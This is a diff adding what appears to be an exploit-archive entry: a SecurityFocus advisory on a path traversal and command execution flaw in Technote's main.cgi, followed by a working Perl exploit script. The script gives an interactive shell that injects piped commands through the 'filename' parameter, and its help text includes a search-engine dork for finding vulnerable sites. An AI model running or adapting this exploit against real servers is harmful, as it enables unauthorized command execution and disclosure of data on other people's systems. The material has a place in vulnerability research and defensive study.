@@ -1,0 +1,192 @@
+source: http://www.securityfocus.com/bid/2156/info
+
+Technote Inc. offers a multi-communication Package that includes a web board type of service.
+
+A script that ships with Technote, 'main.cgi', accepts a parameter called 'filename'. This remotely supplied variable is used as a filename when the open() function is called. In addition to allowing the attacker to specify a file to be opened remotely, the variable is not checked for '../' character sequences. As a result, a malicious remote user can specify any file on the file system as this variable (by using ../ sequences followed by its real path), which will be opened by the script. Its contents will then be disclosed to the attacker.
+
+It is reported that this issue could be leveraged to execute arbitrary commands on the affected computer as well. This issue is due to a failure of the application to properly sanitize the offending URI parameter.
+
+Successful exploitation of this vulnerability could lead to the disclosure of sensitive information and arbitrary system command execution, possibly assisting in further attacks against the affected computer.
+
+Udate: This vulnerability has been updated; previously it was classified strictly as a file disclosure vulnerability. New information has become available that suggests that this issue may be leveraged to execute arbitrary commands on the affected computer as well. 
+
+##############################################
+# Technote Inc. from Korea Command Excution
+# Spawn bash style Shell with webserver uid
+# This Script is currently under development
+##############################################
+
+use strict;
+use IO::Socket;
+my $host;
+my $port;
+my $command;
+my $url;
+my $pdf;
+my $url1;
+my $number;
+my $url2;
+my $shiz;
+my @results;
+my $probe;
+my @U;
+$U[1] = "/technote/main.cgi/";
+&intro;
+&scan;
+&choose;
+&command;
+&exit; 
+sub intro {
+&help;
+&host;
+&server;
+sleep 1;
+};
+sub host {
+print "\nHost or IP : ";
+$host=<STDIN>;
+chomp $host;
+if ($host eq ""){$host="127.0.0.1"};
+$shiz = "|";
+print "\nPort (enter to accept 80): ";
+$port=<STDIN>;
+chomp $port;
+if ($port =~/\D/ ){$port="80"};
+if ($port eq "" ) {$port = "80"};
+print "\nInsert found document file : ";
+$pdf=<STDIN>;
+chomp $pdf;
+$url1="?down_num=";
+print "\nInsert down number : ";
+$number=<STDIN>;
+chomp $number;
+$url2="&board=kleadata1&command=down_load&filename=sanction.pdf.txt";
+}; 
+sub server {
+my $X;
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+$probe = "string";
+my $output;
+my $webserver = "something";
+&connect;
+for ($X=0; $X<=10; $X++){
+ $output = $results[$X];
+ if (defined $output){
+ if ($output =~/apache/){ $webserver = "apache" };
+ };
+};
+if ($webserver ne "apache"){
+my $choice = "y";
+chomp $choice;
+if ($choice =~/N/i) {&exit};
+            }else{
+print "\n\nOK";
+ };  
+};  
+sub scan {
+my $status = "not_vulnerable";
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+my $loop;
+my $output;
+my $flag;
+$command="ls";
+for ($loop=1; $loop < @U; $loop++) { 
+$flag = "0";
+$url = $U[$loop];
+$probe = "scan";
+&connect;
+foreach $output (@results){
+if ($output =~ /Directory/) {
+                              $flag = "1";
+         $status = "vulnerable";
+         };
+ };
+if ($flag eq "0") { 
+}else{
+     };
+};
+if ($status eq "not_vulnerable"){
+
+    };
+}; 
+sub choose {
+
+my $choice="1";
+chomp $choice;
+if ($choice > @U){ &choose };
+if ($choice =~/\D/g ){ &choose };
+if ($choice == 0){ &other };
+$url = $U[$choice];
+}; 
+sub other {
+my $other = <STDIN>;
+chomp $other;
+$U[0] = $other;
+};  
+sub command {
+while ($command !~/quit/i) {
+print "[$host]\$ ";
+$command = <STDIN>;
+chomp $command;
+if ($command =~/quit/i) { &exit };
+if ($command =~/url/i) { &choose }; 
+if ($command =~/scan/i) { &scan };
+if ($command =~/help/i) { &help };
+$command =~ s/\s/+/g; 
+$probe = "command";
+if ($command !~/quit|url|scan|help/) {&connect};
+};
+&exit;
+};  
+sub connect {
+my $connection = IO::Socket::INET->new (
+    Proto => "tcp",
+    PeerAddr => "$host",
+    PeerPort => "$port",
+    ) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
+$connection -> autoflush(1);
+if ($probe =~/command|scan/){
+print $connection "GET $url$pdf$url1$number$url2$shiz$command$shiz HTTP/1.1\r\nHost: $host\r\n\r\n";
+}elsif ($probe =~/string/) {
+print $connection "HEAD / HTTP/1.1\r\nHost: $host\r\n\r\n";
+};
+
+while ( <$connection> ) { 
+   @results = <$connection>;
+    };
+close $connection;
+if ($probe eq "command"){ &output };
+if ($probe eq "string"){ &output };
+};  
+sub output{
+my $display;
+if ($probe eq "string") {
+   my $X;
+   for ($X=0; $X<=10; $X++) {
+   $display = $results[$X];
+   if (defined $display){print "$display";};
+    };
+   }else{
+   foreach $display (@results){
+       print "$display";
+    };
+                          };
+};  
+sub exit{
+print "\n\n\n ORP";
+exit;
+};
+sub help {
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+print "\n
+        Technote Inc. from Korea Command Excution
+        Command Execution Vulnerability by SPABAM 2004" ;
+print "\n http://www.securityfocus.com/bid/2156
+";
+print "\n Technote Exploit v1.2";
+print "\n \n sugg.. google it: allinurl:technote/main.cgi*filename=*";
+print "\n";
+print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
+print "\n Command: SCAN URL HELP QUIT";
+print "\n\n\n\n\n\n\n\n\n\n\n";
+};
